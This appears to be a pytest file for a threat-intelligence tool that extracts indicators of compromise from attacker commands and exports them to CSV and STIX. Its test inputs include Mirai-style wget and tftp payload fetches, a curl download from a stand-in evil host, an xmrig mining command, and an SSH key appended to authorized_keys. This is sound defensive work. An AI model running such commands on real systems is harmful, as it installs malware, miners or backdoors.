import json

from triage.iocs import extract_from_text, iocs_from_events, ssh_key_fingerprint, to_csv, to_stix


def types(text):
    return {(t, v) for t, v, _ in extract_from_text(text)}


def test_url_c2_and_payload():
    found = types("cd /tmp; wget http://198.51.100.65/bins/sora.x86 -O sora; chmod 777 sora")
    assert ("url", "http://198.51.100.65/bins/sora.x86") in found
    assert ("c2_ip", "198.51.100.65") in found


def test_bare_ip_from_tftp_and_domain_urls():
    assert ("c2_ip", "198.51.100.23") in types("/bin/busybox tftp -g -r sora.arm7 198.51.100.23")
    found = types("curl -s -o /tmp/x http://evil.example.net/x.sh")
    assert ("domain", "evil.example.net") in found


def test_egress_check_services_and_internal_ips_are_not_iocs():
    assert types("curl -s https://ifconfig.me") == set()
    assert types("wget -qO- http://ifconfig.me") == set()
    assert not any(t == "c2_ip" for t, _ in types("ping 10.0.0.1; ping 127.0.0.1"))


def test_miner_wallet_pool_and_ssh_key():
    wallet = "4" + "A" * 94
    found = types(f"./xmrig -o stratum+tcp://pool.minexmr.example:4444 -u {wallet} --donate-level 1")
    assert ("mining_pool", "pool.minexmr.example:4444") in found
    assert ("monero_wallet", wallet) in found
    key = "AAAAC3NzaC1lZDI1NTE5AAAAIOu9cE2Fq0xU3e5i4fA9"
    found = types(f"echo 'ssh-ed25519 {key} sys' >> ~/.ssh/authorized_keys")
    assert ("ssh_key", ssh_key_fingerprint(key)) in found


def test_feed_from_simulation(sim, events):
    indicators = iocs_from_events(events)
    by_type = {}
    for ind in indicators:
        by_type.setdefault(ind.type, []).append(ind)
    # The Mirai campaign shares one C2 across several bots.
    mirai_ips = {ip for ip, t in sim.truth.items() if t.scenario == "mirai_botnet"}
    shared_c2 = [i for i in by_type["c2_ip"] if i.source_ips == mirai_ips]
    assert len(shared_c2) == 1
    # The benign operator's egress check never becomes an indicator.
    assert not any("10.0.0.5" in i.source_ips for i in indicators)
    assert all(not i.value.startswith("10.") for i in by_type["attacker_ip"])


def test_exclusions_and_exports(events):
    indicators = iocs_from_events(events, exclude_sources={"10.0.0.47"})
    assert not any("10.0.0.47" in i.source_ips for i in indicators)
    csv_text = to_csv(indicators)
    assert csv_text.splitlines()[0] == "Indicator,Type,FirstSeen,LastSeen,Sightings,SourceIPs,Description"
    bundle = to_stix(indicators)
    assert bundle["type"] == "bundle"
    patterns = [o["pattern"] for o in bundle["objects"] if o["type"] == "indicator"]
    assert any(p.startswith("[file:hashes.'SHA-256'") for p in patterns)
    assert any(p.startswith("[network-traffic:dst_ref.value") for p in patterns)
    json.dumps(bundle)  # serializable
    # Deterministic ids: the same indicator keeps its STIX id across runs.
    again = {o["id"] for o in to_stix(indicators)["objects"] if o["type"] == "indicator"}
    assert again == {o["id"] for o in bundle["objects"] if o["type"] == "indicator"}
